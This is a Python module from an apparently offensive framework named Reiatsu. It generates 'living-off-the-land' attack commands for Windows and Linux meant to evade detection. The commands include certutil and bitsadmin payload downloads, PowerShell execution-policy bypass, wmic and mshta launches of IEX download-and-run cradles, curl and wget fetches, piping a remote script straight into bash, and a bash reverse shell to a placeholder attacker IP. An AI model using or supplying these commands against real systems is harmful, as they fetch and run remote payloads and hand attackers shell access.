"""
Reiatsu LOLBins Module - Living-Off-The-Land binary techniques.
"""
import platform
import io
import sys

class LOLBins:
    """LOLBins Executor: Generates commands using native OS binaries for stealth."""
    
    @staticmethod
    def _get_windows_templates():
        """Returns Windows LOLBins command templates."""
        url = "http://<YOUR_SERVER>/payload.txt"
        out_path = "C:\\Windows\\Tasks\\payload.ps1"
        
        return {
            "Download with certutil": f"certutil.exe -urlcache -split -f {url} {out_path}",
            "Download with bitsadmin": f"bitsadmin /transfer reiatsu_dl /download /priority normal {url} {out_path}",
            "Execute PowerShell script": f"powershell.exe -ExecutionPolicy Bypass -File {out_path}",
            "Execute with wmic": f"wmic.exe process call create \"powershell.exe -c 'IEX(New-Object Net.WebClient).DownloadString(\\\"{url}\\\")'\"",
            "Execute with mshta": f"mshta.exe javascript:a=new ActiveXObject('WScript.Shell');a.Run('powershell.exe -c \"IEX(...)\"',0,true);close();"
        }

    @staticmethod
    def _get_linux_templates():
        """Returns Linux LOLBins/GTFOBins command templates."""
        url = "http://<YOUR_SERVER>/payload.sh"
        out_path = "/tmp/payload.sh"
        
        return {
            "Download with curl": f"curl -o {out_path} {url}",
            "Download with wget": f"wget -O {out_path} {url}",
            "Execute with bash": f"bash {out_path}",
            "Reverse shell with bash": "/bin/bash -i >& /dev/tcp/<YOUR_IP>/<YOUR_PORT> 0>&1",
            "Fileless execution": f"curl -s {url} | bash"
        }

    @staticmethod
    def run_remote(args):
        """Main entry point for the LOLBins module."""
        old_stdout = sys.stdout
        sys.stdout = captured_output = io.StringIO()

        try:
            print(f"[+] Generating LOLBins templates for {platform.system()}...")
            print("[!] Replace placeholder values like <YOUR_SERVER>.")
            
            if platform.system() == "Windows":
                templates = LOLBins._get_windows_templates()
                print("\nWindows LOLBins:")
                for name, cmd in templates.items():
                    print(f"\n--- {name} ---\n  {cmd}")
                    
            elif platform.system() == "Linux":
                templates = LOLBins._get_linux_templates()
                print("\nLinux LOLBins:")
                for name, cmd in templates.items():
                    print(f"\n--- {name} ---\n  {cmd}")
            else:
                print(f"[!] Unsupported OS: {platform.system()}")

        except Exception as e:
            print(f"[-] Module execution failed: {e}")
        finally:
            sys.stdout = old_stdout
            
        return captured_output.getvalue()
